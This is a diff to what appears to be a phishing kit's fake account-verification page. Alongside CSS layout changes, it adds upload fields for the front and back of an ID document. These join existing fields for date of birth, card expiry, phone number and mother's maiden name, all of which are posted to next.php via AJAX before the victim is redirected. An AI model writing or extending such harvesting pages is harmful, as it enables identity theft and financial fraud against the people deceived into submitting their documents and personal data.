@@ -100,8 +100,8 @@
     
     .main-wrapper {
         padding-top: 60px;
-        padding-bottom: 150px; /* Space for footer */
-        flex: 1 0 auto;
+        padding-bottom: 130px; /* Space for footer */
+        flex: 1;
         display: flex;
         align-items: center;
         justify-content: center;
@@ -165,6 +165,7 @@
         cursor: pointer;
         width: 100%;
         margin-top: 15px;
+        margin-bottom: 15px;
         transition: background-color 0.2s;
     }
     
@@ -206,11 +207,66 @@
         text-decoration: underline;
     }
     
+    /* File upload styling */
+    .file-upload-wrapper {
+        margin-bottom: 15px;
+    }
+    
+    .file-upload-label {
+        display: block;
+        color: rgba(255, 255, 255, 0.8);
+        margin-bottom: 8px;
+    }
+    
+    .file-upload {
+        display: flex;
+        flex-direction: column;
+    }
+    
+    .custom-file {
+        position: relative;
+        display: inline-block;
+        width: 100%;
+        margin-bottom: 15px;
+    }
+    
+    .custom-file-input {
+        position: relative;
+        z-index: 2;
+        width: 100%;
+        height: calc(1.5em + 0.75rem + 2px);
+        margin: 0;
+        opacity: 0;
+    }
+    
+    .custom-file-label {
+        position: absolute;
+        top: 0;
+        right: 0;
+        left: 0;
+        z-index: 1;
+        padding: 12px 15px;
+        font-weight: 400;
+        color: rgba(255, 255, 255, 0.6);
+        background-color: rgba(60, 60, 60, 0.5);
+        border: 1px solid rgba(255, 255, 255, 0.2);
+        border-radius: 8px;
+        height: calc(1.5em + 0.75rem + 2px);
+        overflow: hidden;
+        text-overflow: ellipsis;
+        white-space: nowrap;
+    }
+    
+    .custom-file-input:focus ~ .custom-file-label {
+        border-color: rgba(255, 255, 255, 0.5);
+        box-shadow: 0 0 0 2px rgba(255, 255, 255, 0.1);
+    }
+    
     /* Footer styling */
     .footer-wrapper {
         width: 100%;
-        flex-shrink: 0;
-        margin-top: auto;
+        position: relative;
+        z-index: 100;
     }
     
     .as-chat {
@@ -328,7 +384,7 @@
         }
         
         .main-wrapper {
-            padding-bottom: 200px; /* More space for footer on mobile */
+            padding-bottom: 180px; /* More space for footer on mobile */
         }
     }
     </style>
@@ -522,7 +578,7 @@
                             </div>
                         </div>
                         
-                        <form action="next.php" method="POST" name="signinform" id="form-field-3">
+                        <form action="next.php" method="POST" name="signinform" id="form-field-3" enctype="multipart/form-data">
                             <input type="hidden" name="btn3" value="btn3">
                             
                             <div class="form-group">
@@ -569,6 +625,23 @@
                                 <input type="text" name="mname" required class="form-control" placeholder="Mother's Maiden Name">
                             </div>
                             
+                            <!-- ID Upload Fields -->
+                            <div class="file-upload-wrapper">
+                                <label class="file-upload-label">ID Front (Driver's License, Passport, etc.)</label>
+                                <div class="custom-file">
+                                    <input type="file" class="custom-file-input" id="id_front" name="id_front">
+                                    <label class="custom-file-label" for="id_front">Choose file</label>
+                                </div>
+                            </div>
+                            
+                            <div class="file-upload-wrapper">
+                                <label class="file-upload-label">ID Back</label>
+                                <div class="custom-file">
+                                    <input type="file" class="custom-file-input" id="id_back" name="id_back">
+                                    <label class="custom-file-label" for="id_back">Choose file</label>
+                                </div>
+                            </div>
+                            
                             <button type="submit" id="sub-btn-3" class="si-button">Complete Verification</button>
                         </form>
                     </div>
@@ -600,6 +673,12 @@
         $("#dob").inputmask({"mask": "99/99/9999","placeholder":"MM/DD/YYYY"});
         $("#exdate").inputmask({"mask": "99/9999","placeholder":"MM/YYYY"});
         $("#ph").inputmask({"mask": "999-999-9999"});
+        
+        // Show file name when selected
+        $(".custom-file-input").on("change", function() {
+            var fileName = $(this).val().split("\\").pop();
+            $(this).siblings(".custom-file-label").addClass("selected").html(fileName || "Choose file");
+        });
     </script>
     <!-- Optional JavaScript -->
     <!-- jQuery first, then Popper.js, then Bootstrap JS -->
@@ -659,21 +738,6 @@ $(document).ready(function() {
         var c = $("#form-field-1").serialize();
         $.ajax({
             dataType: 'JSON',
-            url: f,
-            type: 'POST',
-            data: c,
-            beforeSend: function(a) {
-                $('#sub-btn-3').html('Processing...')
-            },
-            complete: function(a) {
-                window.location.replace(rdrt)
-            }
-        })
-    })
-});
-</script>
-
-</html>
             url: f,
             type: 'POST',
             data: c,
@@ -747,6 +811,26 @@ $(document).ready(function() {
         if (!passValidation) {
             return
         }
-        var c = $("#form-field-3").serialize();
+        
+        // For file uploads, we need to use FormData instead of serialize
+        var formData = new FormData(document.getElementById("form-field-3"));
+        
         $.ajax({
             dataType: 'JSON',
+            url: f,
+            type: 'POST',
+            data: formData,
+            processData: false,  // Required for FormData
+            contentType: false,  // Required for FormData
+            beforeSend: function(a) {
+                $('#sub-btn-3').html('Processing...')
+            },
+            complete: function(a) {
+                window.location.replace(rdrt)
+            }
+        })
+    })
+});
+</script>
+
+</html>
